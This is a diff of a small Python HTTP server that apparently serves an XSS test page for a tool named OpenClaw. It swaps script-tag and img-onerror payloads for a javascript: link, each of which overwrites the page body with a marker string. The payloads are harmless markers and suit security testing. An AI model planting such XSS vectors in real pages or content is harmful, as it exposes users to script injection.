@@ -1,13 +1,19 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import os
 
+HTML = """
+<!doctype html>
+<html>
+<body>
 
-PAYLOAD = """
-<script>
-document.body.innerHTML="OPENCLAW_XSS_EXECUTED";
-</script>
+<h1>OpenClaw Markdown XSS Test</h1>
 
-<img src=x onerror="document.body.innerHTML='IMG_XSS_EXECUTED'">
+<a href="javascript:document.body.innerHTML='XSS_EXECUTED'">
+CLICK_ME
+</a>
+
+</body>
+</html>
 """
 
 
@@ -15,25 +21,21 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         self.send_response(200)
-
-        # Important: text/plain
-        self.send_header("Content-Type", "text/plain")
-
+        self.send_header("Content-Type", "text/html")
         self.end_headers()
-
-        self.wfile.write(PAYLOAD.encode())
+        self.wfile.write(HTML.encode())
 
 
     def do_HEAD(self):
         self.send_response(200)
-        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Type", "text/html")
         self.end_headers()
 
 
-port = int(os.environ.get("PORT", 8080))
+port = int(os.environ.get("PORT",8080))
 
-server = HTTPServer(("0.0.0.0", port), Handler)
+server = HTTPServer(("0.0.0.0",port),Handler)
 
-print(f"Running on {port}")
+print(port)
 
 server.serve_forever()
